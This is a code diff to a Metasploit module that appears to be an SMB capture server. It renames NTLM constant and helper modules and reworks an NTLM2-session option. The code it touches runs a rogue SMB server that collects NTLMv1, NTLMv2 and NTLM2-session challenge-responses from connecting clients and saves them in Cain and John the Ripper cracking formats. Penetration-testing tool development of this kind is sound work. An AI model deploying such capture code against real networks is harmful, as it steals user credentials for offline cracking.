@@ -61,20 +61,20 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_advanced_options(
 			[
-				OptBool.new("SMB_EXTENDED_SECURITY",  [ true, "Use smb extended security negociation", false ]),
-				OptBool.new("NTLM_EXTENDED_SECURITY", [ true, "Use ntlm extended security when smb extended security is set", false ]),
-				OptBool.new("USE_GSS_NEGOCIATION",    [ true, "Send an gss_security blob in smb_negociate response when smb extended security is set", false ]),
+				OptBool.new("SMB_EXTENDED_SECURITY",  [ true, "Use smb extended security negociation, when set client will use ntlmssp, if not then client will use classic lanman authentification", false ]),
+				OptBool.new("NTLM_UseNTLM2_session", [ true,  "activate the 'Negotiate NTLM2 key' flag in ntlm authentification when  smb extended security negociation is set,  client will use ntlm2_session instead of ntlmv1 (default on win 2K and above)", false ]),
+				OptBool.new("USE_GSS_NEGOCIATION",    [ true, "Send an gss_security blob in smb_negociate response when smb extended security is set, when this flag is not set windows will respond without gss encapsulation, ubuntu will still use gss", false ]),
 				OptString.new('DOMAIN_NAME',          [ true, "The domain name used during smb exchange with smb extended security set ", "anonymous" ])
 			], self.class)
 
 	end
 
-	def run
-
+	def run 
 		@s_smb_esn = datastore['SMB_EXTENDED_SECURITY']
-		@s_ntlm_esn = datastore['NTLM_EXTENDED_SECURITY']
+		@s_ntlm_esn = datastore['NTLM_UseNTLM2_session']
 		@s_gss_neg = datastore['USE_GSS_NEGOCIATION']
 		@domain_name = datastore['DOMAIN_NAME']
+
 		@s_GUID = [Rex::Text.rand_text_hex(32)].pack('H*')
 		if datastore['CHALLENGE'].to_s =~ /^([a-fA-F0-9]{16})$/
 			@challenge = [ datastore['CHALLENGE'] ].pack("H*")
@@ -184,7 +184,7 @@ class Metasploit3 < Msf::Auxiliary
 			pkt['Payload'].v['Payload'] = @s_GUID
 
 			if @s_gss_neg then
-				pkt['Payload'].v['Payload'] += UTILS::make_simple_negotiate_secblob_resp
+				pkt['Payload'].v['Payload'] += NTLM_UTILS::make_simple_negotiate_secblob_resp
 			end
 
 		else
@@ -231,13 +231,13 @@ class Metasploit3 < Msf::Auxiliary
 
 
 			end
-			ntlm_message = NTLM::Message.parse(blob)
+			ntlm_message = NTLM_MESSAGE::parse(blob)
 
 			case ntlm_message
-			when NTLM::Message::Type1
+			when NTLM_MESSAGE::Type1
 				#Send Session Setup AndX Response NTLMSSP_CHALLENGE response packet
 
-				if (ntlm_message.flag & CONST::NEGOTIATE_NTLM2_KEY != 0)
+				if (ntlm_message.flag & NTLM_CONST::NEGOTIATE_NTLM2_KEY != 0)
 					c_ntlm_esn = true
 				else
 					c_ntlm_esn = false
@@ -269,14 +269,14 @@ class Metasploit3 < Msf::Auxiliary
 					sb_flag = 0xe2828215 #no ntlm2
 				end
 				if c_gss
-					securityblob = UTILS::make_ntlmv2_secblob_chall( win_domain,
+					securityblob = NTLM_UTILS::make_ntlmssp_secblob_chall( win_domain,
 											win_name,
 											dns_domain,
 											dns_name,
 											@challenge,
 											sb_flag)
 				else
-					securityblob = UTILS::make_ntlm_type2_blob( 	win_domain,
+					securityblob = NTLM_UTILS::make_ntlmssp_blob_chall( 	win_domain,
 											win_name,
 											dns_domain,
 											dns_name,
@@ -289,7 +289,7 @@ class Metasploit3 < Msf::Auxiliary
 
 				c.put(pkt.to_s)
 
-			when NTLM::Message::Type3
+			when NTLM_MESSAGE::Type3
 				#we can process the hash and send a status_logon_failure response packet
 
 				# Record the remote multiplex ID
@@ -298,18 +298,18 @@ class Metasploit3 < Msf::Auxiliary
 				nt_len = ntlm_message.ntlm_response.length
 
 				if nt_len == 24 #lmv1/ntlmv1 or ntlm2_session
-					arg = {	:ntlm_ver => CONST::NTLM_V1_RESPONSE,
+					arg = {	:ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
 						:lm_hash => ntlm_message.lm_response.unpack('H*')[0],
 						:nt_hash => ntlm_message.ntlm_response.unpack('H*')[0]
 					}
 
 					if @s_ntlm_esn && arg[:lm_hash][16,32] == '0' * 32
-						arg[:ntlm_ver] = CONST::NTLM_2_SESSION_RESPONSE
+						arg[:ntlm_ver] = NTLM_CONST::NTLM_2_SESSION_RESPONSE
 					end
 				#if the length of the ntlm response is not 24 then it will be bigger and represent
 				# a ntlmv2 response
 				elsif nt_len > 24 #lmv2/ntlmv2
-					arg = {	:ntlm_ver 		=> CONST::NTLM_V2_RESPONSE,
+					arg = {	:ntlm_ver 		=> NTLM_CONST::NTLM_V2_RESPONSE,
 						:lm_hash 		=> ntlm_message.lm_response[0, 16].unpack('H*')[0],
 						:lm_cli_challenge 	=> ntlm_message.lm_response[16, 8].unpack('H*')[0],
 						:nt_hash 		=> ntlm_message.ntlm_response[0, 16].unpack('H*')[0],
@@ -363,14 +363,14 @@ class Metasploit3 < Msf::Auxiliary
 
 
 			if nt_len == 24
-				arg = {	:ntlm_ver => CONST::NTLM_V1_RESPONSE,
+				arg = {	:ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
 					:lm_hash => pkt['Payload'].v['Payload'][0, lm_len].unpack("H*")[0],
 					:nt_hash => pkt['Payload'].v['Payload'][lm_len, nt_len].unpack("H*")[0]
 				}
 			#if the length of the ntlm response is not 24 then it will be bigger and represent
 			# a ntlmv2 response
 			elsif nt_len > 24
-				arg = {	:ntlm_ver => CONST::NTLM_V2_RESPONSE,
+				arg = {	:ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE,
 					:lm_hash => pkt['Payload'].v['Payload'][0, 16].unpack("H*")[0],
 					:lm_cli_challenge => pkt['Payload'].v['Payload'][16, 8].unpack("H*")[0],
 					:nt_hash => pkt['Payload'].v['Payload'][lm_len, 16].unpack("H*")[0],
@@ -410,7 +410,7 @@ class Metasploit3 < Msf::Auxiliary
 	def smb_get_hash(smb,arg = {})
 
 		ntlm_ver = arg[:ntlm_ver]
-		if ntlm_ver == CONST::NTLM_V1_RESPONSE or ntlm_ver == CONST::NTLM_2_SESSION_RESPONSE
+		if ntlm_ver == NTLM_CONST::NTLM_V1_RESPONSE or ntlm_ver == NTLM_CONST::NTLM_2_SESSION_RESPONSE
 			lm_hash = arg[:lm_hash]
 			nt_hash = arg[:nt_hash]
 		else
@@ -441,9 +441,9 @@ class Metasploit3 < Msf::Auxiliary
 			@previous_ntlm_hash = nt_hash
 
 			#TODO: check if the hash crrespond to an empty password
-			if ntlm_ver == CONST::NTLM_V1_RESPONSE  and  (lm_hash == nt_hash or lm_hash == "" or lm_hash =~ /^0*$/ ) then
+			if ntlm_ver == NTLM_CONST::NTLM_V1_RESPONSE  and  (lm_hash == nt_hash or lm_hash == "" or lm_hash =~ /^0*$/ ) then
 				lm_hash_message = "Disabled"
-			elsif  ntlm_ver == CONST::NTLM_V2_RESPONSE and lm_hash == '0' * 32 and lm_cli_challenge == '0' * 16
+			elsif  ntlm_ver == NTLM_CONST::NTLM_V2_RESPONSE and lm_hash == '0' * 32 and lm_cli_challenge == '0' * 16
 				lm_hash_message = "Disabled"
 				lm_chall_message = 'Disabled'
 			else
@@ -453,12 +453,12 @@ class Metasploit3 < Msf::Auxiliary
 
 			capturedtime = Time.now.to_s
 		case ntlm_ver
-			when CONST::NTLM_V1_RESPONSE
+			when NTLM_CONST::NTLM_V1_RESPONSE
 				capturelogmessage =
 					"#{capturedtime}\nNTLMv1 Response Captured from #{smb[:name]} \n" +
 					"#{smb[:domain]}\\#{smb[:username]} OS:#{smb[:peer_os]} LM:#{smb[:peer_lm]}\n" +
 					"LMHASH:#{lm_hash_message ? lm_hash_message : "<NULL>"} \nNTHASH:#{nt_hash ? nt_hash : "<NULL>"}\n"
-			when CONST::NTLM_V2_RESPONSE
+			when NTLM_CONST::NTLM_V2_RESPONSE
 				capturelogmessage =
 					"#{capturedtime}\nNTLMv2 Response Captured from #{smb[:name]} \n" +
 					"#{smb[:domain]}\\#{smb[:username]} OS:#{smb[:peer_os]} LM:#{smb[:peer_lm]}\n" +
@@ -466,7 +466,7 @@ class Metasploit3 < Msf::Auxiliary
 					"LM_CLIENT_CHALLENGE:#{lm_chall_message ? lm_chall_message : "<NULL>"}\n" +
 					"NTHASH:#{nt_hash ? nt_hash : "<NULL>"} " +
 					"NT_CLIENT_CHALLENGE:#{nt_cli_challenge ? nt_cli_challenge : "<NULL>"}\n"
-			when CONST::NTLM_2_SESSION_RESPONSE
+			when NTLM_CONST::NTLM_2_SESSION_RESPONSE
 				capturelogmessage =
 					"#{capturedtime}\nNTLM2_SESSION Response Captured from #{smb[:name]} \n" +
 					"#{smb[:domain]}\\#{smb[:username]} OS:#{smb[:peer_os]} LM:#{smb[:peer_lm]}\n" +
@@ -516,7 +516,7 @@ class Metasploit3 < Msf::Auxiliary
 			end
 
 			if(datastore['CAINPWFILE'] and smb[:username])
-				if ntlm_ver == CONST::NTLM_V1_RESPONSE then
+				if ntlm_ver == NTLM_CONST::NTLM_V1_RESPONSE then
 					fd = File.open(datastore['CAINPWFILE'], "ab")
 					fd.puts(
 						[
@@ -533,7 +533,7 @@ class Metasploit3 < Msf::Auxiliary
 
 			if(datastore['JOHNPWFILE'] and smb[:username])
 				case ntlm_ver
-				when CONST::NTLM_V1_RESPONSE
+				when NTLM_CONST::NTLM_V1_RESPONSE
 
 					fd = File.open(datastore['JOHNPWFILE'] + '_lmv1_ntlmv1', "ab")
 					fd.puts(
@@ -546,7 +546,7 @@ class Metasploit3 < Msf::Auxiliary
 						].join(":").gsub(/\n/, "\\n")
 					)
 					fd.close
-				when CONST::NTLM_V2_RESPONSE
+				when NTLM_CONST::NTLM_V2_RESPONSE
 					#lmv2
 					fd = File.open(datastore['JOHNPWFILE'] + '_lmv2', "ab")
 					fd.puts(
